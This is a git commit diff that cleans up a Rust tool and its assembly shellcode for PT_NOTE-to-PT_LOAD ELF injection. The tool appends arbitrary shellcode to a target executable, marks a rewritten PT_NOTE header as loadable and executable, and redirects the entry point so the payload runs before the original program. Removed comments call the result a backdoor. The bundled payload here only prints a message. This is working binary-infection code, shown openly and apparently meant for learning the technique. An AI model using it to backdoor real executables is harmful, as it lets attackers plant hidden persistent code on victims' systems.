66f158ee1676403b45f3b1dc3a6a1750959d5beb
d3npa <d3npa@pm.me>
2021-03-19 12:08:01 -0400

    Cleanup and simplify code

--- injection/ptnote-to-ptload-elf-injection/files/shellcode.s
+++ injection/ptnote-to-ptload-elf-injection/files/shellcode.s
@@ -2,9 +2,9 @@ BITS 64
 global _start
 section .text
 _start:
-    jmp short init
+    call main
+    db "dont tell anyone im here", 0xa, 0x0
 main:
-    ; write(1, str, len);
     xor rax, rax
     xor rdx, rdx
     inc al
@@ -13,10 +13,5 @@ main:
     mov dl, 25
     syscall
     xor rdx, rdx
-    jmp short finish
-init:
-    call main
-    db "dont tell anyone im here", 0xa, 0x0
-finish:
     ; mov rax, 0x0123456789abcdef
     ; jmp rax
--- injection/ptnote-to-ptload-elf-injection/src/main.rs
+++ injection/ptnote-to-ptload-elf-injection/src/main.rs
@@ -1,102 +1,81 @@
-use mental_elf::utils::{Result, StringError};
 use mental_elf::elf64::constants::*;
 use std::{env, fs, process};
 use std::io::prelude::*;
 use std::io::SeekFrom;
 
-fn main() -> Result<()> {
-    // 引数を取る
-    let args = parse_args().unwrap_or_else(|err| {
-        eprintln!("{}", err);
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let args: Vec<String> = env::args().collect();
+    if args.len() != 3 {
+        eprintln!("Usage: {} <ELF File> <Shellcode File>", args[0]);
         process::exit(1);
-    });
+    }
 
-    // パッチ対象のELFファイルを開く
+    let elf_path = &args[1];
+    let sc_path = &args[2];
+
+    // Open target ELF file with RW permissions
     let mut elf_fd = fs::OpenOptions::new()
-        .read(true).write(true).open(&args.elf_path)?;
+        .read(true)
+        .write(true)
+        .open(&elf_path)?;
 
-    // シェルコードをファイルから読み込む
-    let mut shellcode: Vec<u8> = vec![];
-    let mut sc_fd = fs::File::open(args.sc_path)?;
-    sc_fd.read_to_end(&mut shellcode)?;
+    // Load shellcode from file
+    let mut shellcode: Vec<u8> = fs::read(&sc_path)?;
 
+    // Parse ELF and program headers
     let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
-
-    // これら、どうせfdを渡すならread_program_headersの関数内で取得できそうじゃない？
-    let phdr_offset = elf_header.e_phoff;
-    let phdr_num = elf_header.e_phnum;
-
     let mut program_headers = mental_elf::read_elf64_program_headers(
-        &mut elf_fd, phdr_offset, phdr_num)?;
+        &mut elf_fd, 
+        elf_header.e_phoff, 
+        elf_header.e_phnum,
+    )?;
 
-    // シェルコードの処理が終わったら本来のエントリポイントに戻るようにパッチする
+    // Patch the shellcode to jump to the original entry point after finishing
     patch_jump(&mut shellcode, elf_header.e_entry);
 
-    // バックドアの様々な情報をまとめる
-    let file_len = elf_fd.metadata()?.len();
-    let bd = Backdoor {
-        shellcode,
-        file_offset: file_len,
-        memory_offset: 0xc00000000 + file_len,
-    };
+    // Append the shellcode to the very end of the target ELF
+    elf_fd.seek(SeekFrom::End(0))?;
+    elf_fd.write(&shellcode)?;
 
-    // PT_NOTEセクションをパッチしてファイル末尾に追加していくシェルコードを読み込ませる
+    // Calculate offsets used to patch the ELF and program headers
+    let sc_len = shellcode.len() as u64;
+    let file_offset = elf_fd.metadata()?.len() - sc_len;
+    let memory_offset = 0xc00000000 + file_offset;
+
+    // Patch the ELF header to start at the shellcode
+    elf_header.e_entry = memory_offset;
+
+    // Look for a PT_NOTE section
     for phdr in &mut program_headers {
         if phdr.p_type == PT_NOTE {
-            println!("Found PT_NOTE; Changing to PT_LOAD");
+            // Convert to a PT_LOAD section with values to load shellcode
+            println!("Found PT_NOTE section; converting to PT_LOAD");
             phdr.p_type = PT_LOAD;
             phdr.p_flags = PF_R | PF_X;
-            phdr.p_vaddr = bd.memory_offset;
-            phdr.p_memsz += bd.shellcode.len() as u64;
-            phdr.p_filesz += bd.shellcode.len() as u64;
-            phdr.p_offset = bd.file_offset;
+            phdr.p_offset = file_offset;
+            phdr.p_vaddr = memory_offset;
+            phdr.p_memsz += sc_len as u64;
+            phdr.p_filesz += sc_len as u64;
             break;
         }
     }
 
-    // ProgramHeaderの変更を書き込む
+    // Commit changes to the program and ELF headers
     mental_elf::write_elf64_program_headers(
-        &mut elf_fd, phdr_offset, phdr_num, program_headers
+        &mut elf_fd, 
+        elf_header.e_phoff,
+        elf_header.e_phnum,
+        program_headers,
     )?;
-
-    elf_header.e_entry = bd.memory_offset;
     mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;
-
-    // シェルコードをファイル末尾に追加する
-    elf_fd.seek(SeekFrom::End(0))?;
-    elf_fd.write(&bd.shellcode)?;
 
     Ok(())
 }
 
-struct Arguments {
-    elf_path: String,
-    sc_path: String,
-}
-
-fn parse_args() -> Result<Arguments> {
-    let args: Vec<String> = env::args().collect();
-
-    if args.len() != 3 {
-        return Err(StringError::boxed(
-            &format!("Usage: {} <ELF File> <Shellcode File>", args[0])
-        ));
-    }
-
-    Ok(Arguments { 
-        elf_path: args[1].clone(), 
-        sc_path: args[2].clone(),
-    })
-}
-
-struct Backdoor {
-    shellcode: Vec<u8>,
-    file_offset: u64,
-    memory_offset: u64,
-}
-
 fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
+    // Store entry_point in rax
     shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
     shellcode.extend_from_slice(&entry_point.to_ne_bytes());
+    // Jump to address in rax
     shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
 }
